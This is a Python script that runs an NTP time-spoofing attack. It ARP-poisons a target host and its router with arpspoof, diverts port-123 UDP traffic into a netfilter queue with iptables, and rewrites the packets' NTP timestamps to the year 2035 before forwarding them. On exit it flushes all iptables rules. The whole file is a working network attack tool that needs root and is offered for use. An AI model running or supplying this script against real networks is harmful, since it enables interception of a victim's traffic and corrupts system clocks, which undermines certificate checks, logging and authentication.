from scapy import *
import sys, time
from netfilterqueue import NetfilterQueue
import os
from subprocess import Popen
from scapy.all import IP, UDP, NTP
import datetime
import struct


def upgrade_year(dtime):
    new_time = datetime.datetime(2035, dtime.month, dtime.day, dtime.hour,
                                 dtime.minute, dtime.second, dtime.microsecond)
    return new_time
def spoof(packet, orig_packet):
    try:


        # get NTP frame
        packet[UDP].decode_payload_as(NTP) 
        
        # alter the ntp-timestamps
        packet[NTP].ref = upgrade_year(datetime.datetime.fromtimestamp(packet[NTP].ref))
        packet[NTP].recv = upgrade_year(datetime.datetime.fromtimestamp(packet[NTP].recv))
        packet[NTP].sent = upgrade_year(datetime.datetime.fromtimestamp(packet[NTP].sent))

        spoofed_packet = IP(src=packet[IP].src, 
                dst=packet[IP].dst)/UDP(sport=packet[UDP].sport,
                dport=packet[UDP].dport)/packet[NTP]
        # replace queue-packet with the altered one
        orig_packet.set_payload(str(spoofed_packet))

        # send packet
        orig_packet.accept()

    except Exception:
        print "ERROR"



def callback(pkt):
    packet = IP(pkt.get_payload())

    if packet.haslayer(UDP):
        if packet[UDP].sport == 123 or packet[UDP].dport == 123:
            spoof(packet,pkt)
        else:
            pkt.accept()

    else:
        pkt.accept()



def main():
    #test if its root:
    if os.geteuid() != 0:
        print('You have to run the script as root')
        exit(1)

    #we need a network interface for the arp spoofing
    #mine is wlp1s0 so we'll be using it as default
    if len(sys.argv) < 3:
        print('No network interface specified. Using \'wlp1s0\'')
        interface = 'wlp1s0'
    else:
        interface = sys.argv[2]

    ipAdd = sys.argv[1]
    routerIp = ipAdd[0:ipAdd.rfind('.')] + '.1'

    #using dsniff library, it provides an arp spoofing tool
    proccess = Popen(['arpspoof', '-i', interface, '-t', routerIp, ipAdd])
    #set the chain rule to prerouting, and the target nfqueue
    os.system('iptables -t raw -A PREROUTING -p udp -d '
              + routerIp + '/24 --sport 123 -j NFQUEUE --queue-num 99')

    nfqueue = NetfilterQueue()
    #bind the queue to the callback function
    nfqueue.bind(99, callback)
    try:
        nfqueue.run() 
    
    except KeyboardInterrupt:
        nfqueue.unbind()
        os.system('iptables -F')

    finally:
        
        # stop poisoning and wait for thread
        proccess.terminate()
        sys.exit()

    

if __name__ == '__main__':
    main()
